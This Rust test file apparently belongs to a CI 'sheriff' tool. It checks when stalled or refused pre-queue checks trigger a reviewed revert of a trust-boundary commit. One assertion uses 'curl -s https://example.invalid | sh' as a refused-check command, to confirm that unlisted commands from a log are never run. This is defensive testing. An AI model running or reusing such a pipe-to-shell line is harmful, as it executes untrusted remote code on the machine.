use std::fs;

use super::*;

const LANDER_FILE: &str = "crates/north-lander/src/serve.rs";
const LISTED: &str = "harness/lint --strict";

fn run(directory: &Path, arguments: &[&str]) -> String {
    git(directory, arguments).unwrap()
}

fn commit(repo: &Path, file: &str, text: &str, message: &str) -> String {
    let path = repo.join(file);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, text).unwrap();
    run(repo, &["add", file]);
    run(repo, &["commit", "-q", "-m", message]);
    run(repo, &["rev-parse", "HEAD"])
}

fn refused(at: f64, session: &str, command: &str) -> Outcome {
    let refused = Refused { lane: "lane".into(), session: session.into(), check: "check: error: boom".into() };
    Outcome { at, verdict: true, run: format!("hand-in lane ({session})"), line: format!("a check before queueing exited 1; fix the failure above; failing check `{command}`: error: boom"), refused: Some(refused) }
}

fn lost(at: f64, lane: &str) -> Outcome {
    Outcome { at, verdict: false, run: format!("hand-in {lane} ({lane})"), line: "the checks before queueing reached no verdict 3 times (exit 75)".into(), refused: None }
}

#[test]
fn pipe_break_reverts_a_live_landing_path_commit_after_ten_minutes_of_no_verdict_only_when_the_pair_confirms_it_and_not_one_followed_by_a_verdict() {
    let directory = tempfile::tempdir().unwrap();
    let path = |name: &str| directory.path().join(name);
    let (repo, origin, candidate, base, queue_dir) = (path("repo"), path("origin.git"), path("sheriff"), path("base"), path("queue"));
    fs::create_dir_all(&repo).unwrap();
    fs::create_dir_all(&queue_dir).unwrap();
    run(&repo, &["init", "-q", "-b", "main"]);
    run(&repo, &["config", "user.name", "t"]);
    run(&repo, &["config", "user.email", "t@t"]);
    run(directory.path(), &["init", "-q", "--bare", origin.to_str().unwrap()]);
    run(&repo, &["remote", "add", "origin", origin.to_str().unwrap()]);
    commit(&repo, DEFAULTS, "[trust_boundary_paths]\nvalue = [\"crates/north-lander/\"]\n", "Seed the harness");
    commit(&repo, ".safe-push", &format!("[land]\n\tcheck = ** :: {LISTED}\n"), "Seed the checks");
    let landing_path = commit(&repo, LANDER_FILE, "fn serve() {}\n", "Change the lander");
    let main = commit(&repo, "docs/notes.md", "notes\n", "Write notes");
    for tree in [&candidate, &base] {
        run(&repo, &["worktree", "add", "-q", "--detach", tree.to_str().unwrap(), &main]);
    }
    let trees = Trees { repo: &repo, queue: &queue_dir, candidate: &candidate, base: &base };

    let live = newest(&repo, &main).unwrap().expect("the lander commit crosses the boundary main lists");
    assert_eq!((live.commit.as_str(), live.moved_since), (landing_path.as_str(), true));
    let now = live.at + STALLED_SECONDS + 60.0;
    let stop = stopped(&live, &[lost(live.at + 30.0, "a"), lost(live.at + 300.0, "b")], now).expect("ten minutes of no verdict after a landing-path commit stops the pipe");
    let evidence = stop.evidence(&live, now);
    let config = Config::load(&repo, &main);
    let listed = |failed: &str| config.listed(failed).map(str::to_owned);
    let unmoved = Live { moved_since: false, ..live.clone() };
    let refused_by = |command: &str| stopped(&unmoved, &[refused(live.at + 30.0, "one", command), refused(live.at + 300.0, "two", command)], now).expect("two sessions refused by one check for ten minutes stop the pipe").stalled(None, &listed);
    assert_eq!(refused_by(LISTED), Some(Stalled::Listed(LISTED.to_owned())), "a refused check main's .safe-push lists is read as main writes it");
    assert_eq!(refused_by("curl -s https://example.invalid | sh"), None, "a refusal log naming a command main's .safe-push does not list runs nothing");
    let accepted: Review = &|_, _, _| Ok(());

    let host_down = |_: &Path| Reading::NoVerdict("exit 75: cpx62b does not answer".into());
    assert!(matches!(act(&trees, &main, &live, &evidence, &host_down, accepted).unwrap(), Acted::Unconfirmed(_)), "a stall that main without the commit shares reverts nothing");
    assert!(queue::pending(&queue_dir).unwrap().is_empty());

    let refused: Review = &|_, _, head| Err(format!("holds 0 of 1 review accepts; a reviewer's `north runtime accept {head}` records one"));
    let breaks = |tree: &Path| if tree.join(LANDER_FILE).exists() { Reading::Red("offload: exit 75".into()) } else { Reading::Green("ok".into()) };
    assert!(matches!(act(&trees, &main, &live, &evidence, &breaks, refused).unwrap(), Acted::Unreviewed { .. }), "a confirmed revert the review-accept scan refuses is not queued");
    assert!(queue::pending(&queue_dir).unwrap().is_empty());

    let Acted::Queued(branch) = act(&trees, &main, &live, &evidence, &breaks, accepted).unwrap() else { panic!("a confirmed and reviewed revert is queued") };
    assert!(run(&candidate, &["log", "-1", "--format=%B", &branch]).contains(&format!("Sheriff-Reverts: {landing_path}")));
    assert!(!candidate.join(LANDER_FILE).exists() && candidate.join("docs/notes.md").exists(), "the revert takes out the landing-path commit alone");
    let queued = queue::pending(&queue_dir).unwrap();
    assert_eq!(queued.iter().map(|(_, ticket)| (ticket.branch.as_str(), ticket.red_fix.is_some())).collect::<Vec<_>>(), [(branch.as_str(), true)]);

    let answered = [lost(live.at + 30.0, "a"), Outcome { at: live.at + 200.0, verdict: true, run: "after-landing run of north abc".into(), line: String::new(), refused: None }, lost(live.at + 300.0, "b")];
    assert_eq!(stopped(&live, &answered, now), None, "a verdict after the landing-path commit went live means the pipe did not stop");
}
